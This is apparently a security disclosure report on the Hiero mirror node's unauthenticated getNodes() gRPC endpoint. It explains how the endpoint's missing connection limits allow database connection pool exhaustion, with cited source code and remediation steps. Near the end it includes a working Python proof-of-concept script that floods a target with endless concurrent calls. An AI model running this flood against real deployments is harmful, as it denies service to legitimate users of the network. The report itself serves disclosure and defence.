### Title
Unauthenticated Unbounded Connection Flooding on `getNodes()` Enabling DB Connection Pool Exhaustion

### Summary
The `getNodes()` gRPC endpoint in `NetworkController` accepts unlimited concurrent connections from any unauthenticated source. The server-side `GrpcConfiguration` only enforces a per-connection call cap (`maxConcurrentCallsPerConnection = 5`) but sets no total connection ceiling, no per-IP rate limit, and no `maxConnectionAge`. Each call synchronously executes multiple blocking DB queries before handing off to the `boundedElastic` scheduler for paged reads, making the HikariCP connection pool the binding resource. A distributed attacker can flood all publicly reachable mirror node instances simultaneously, exhausting the DB pool and denying service to legitimate callers.

### Finding Description

**Code path:**

`NetworkController.getNodes()` (lines 33–43) subscribes to `networkService::getNodes` with no authentication, no connection count check, and no rate-limiting interceptor. [1](#0-0) 

`GrpcConfiguration` (lines 28–35) customises the Netty server with only two settings: the executor and `maxConcurrentCallsPerConnection`. There is no call to `maxConnections()`, `maxConnectionAge()`, `keepAliveTime()`, or any equivalent. [2](#0-1) 

`NettyProperties` hard-codes the per-connection cap at 5 and exposes no total-connection property. [3](#0-2) 

**Blocking DB work per call:**

`NetworkServiceImpl.getNodes()` (lines 61–66) executes three synchronous DB queries (`findLatestTimestamp`, `findLatestTimestamp`, `findAllStakeByConsensusTimestamp`) on the calling thread before returning the `Flux`. Because `NetworkController` uses `Mono.fromCallable(...).flatMapMany(networkService::getNodes)` with no `subscribeOn()`, these blocking calls run on the gRPC worker thread for every incoming call. [4](#0-3) 

Each subsequent page also calls `transactionOperations.execute()` (a blocking JDBC call) on a `boundedElastic` thread, with a 250 ms inter-page delay (`pageDelay`) and `pageSize = 10`. [5](#0-4) [6](#0-5) 

**Root cause / failed assumption:**

The design assumes that `maxConcurrentCallsPerConnection = 5` is a sufficient resource guard. It is not: it limits calls *per connection* but places no ceiling on the number of connections. With N connections, the server accepts 5N concurrent calls. The HikariCP pool (Spring Boot default: 10 connections) is the first resource to saturate.

### Impact Explanation

With N simultaneous attacker connections, up to 5N concurrent `getNodes()` calls are in flight. Each call holds a HikariCP connection during the blocking `transactionOperations.execute()` page fetch. Once the pool is exhausted, every subsequent gRPC call on the same instance — including `subscribeTopic()` — blocks waiting for a connection and eventually times out or errors. Because the endpoint is unauthenticated and publicly exposed on port 5600, the same attack can be replicated against every mirror node instance in a deployment simultaneously. Exhausting ≥30% of instances degrades or eliminates address-book and topic-subscription availability for the entire network's mirror infrastructure.

### Likelihood Explanation

No credentials, tokens, or special protocol knowledge are required — only a valid `AddressBookQuery` with `file_id = 0.0.101` or `0.0.102`. A botnet or even a single host with many source IPs (e.g., via a cloud provider with multiple egress addresses) can open hundreds of connections. The attack is repeatable and stateless: each call completes in ~750 ms for a typical address book, so the attacker simply reconnects in a tight loop. Standard gRPC client libraries make this trivial to script.

### Recommendation

1. **Add a total connection limit** in `GrpcConfiguration`: call `serverBuilder.maxConnectionAge(Duration, TimeUnit)` and use Netty's `maxConnections` channel option to cap simultaneous TCP connections.
2. **Add a `maxConnectionAge`** (e.g., 60 s) and `maxConnectionAgeGrace` to force connection recycling and prevent indefinite resource hold.
3. **Add a gRPC server interceptor** that tracks active calls per source IP and returns `RESOURCE_EXHAUSTED` when a threshold is exceeded.
4. **Increase HikariCP pool size** or, preferably, make the initial DB calls in `NetworkServiceImpl.getNodes()` (lines 61–65) non-blocking / cached so they do not consume pool connections on the gRPC worker thread.
5. **Deploy an ingress-level rate limiter** (e.g., Envoy, nginx) in front of port 5600 to limit new connections per source IP.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import network_service_pb2, network_service_pb2_grpc
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 200   # one per "source IP" in a real botnet scenario
CALLS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = network_service_pb2.AddressBookQuery(
        file_id=basic_types_pb2.FileID(fileNum=102)
    )
    while True:
        threads = []
        for _ in range(CALLS_PER_CONN):
            t = threading.Thread(
                target=lambda: list(stub.getNodes(query))  # drain stream
            )
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        # immediately reconnect — keeps DB pool saturated

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# After ~seconds: HikariCP pool exhausted; all gRPC calls on the instance
# return UNAVAILABLE or hang until statementTimeout (10 s) fires.
```

**Expected result:** Within seconds, `hikaricp_connections_active / hikaricp_connections_max` reaches 1.0 on the targeted instance (observable via the existing Prometheus alert `GrpcHighDBConnections`), and all subsequent gRPC calls return errors or time out.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L61-66)
```java
        long addressBookTimestamp = addressBookRepository
                .findLatestTimestamp(fileId.getId())
                .orElseThrow(() -> new EntityNotFoundException(fileId));
        long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp().orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
        var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
        var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L68-76)
```java
        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/AddressBookProperties.java (L32-37)
```java
    @DurationMin(millis = 100L)
    @NotNull
    private Duration pageDelay = Duration.ofMillis(250L);

    @Min(1)
    private int pageSize = 10;
```
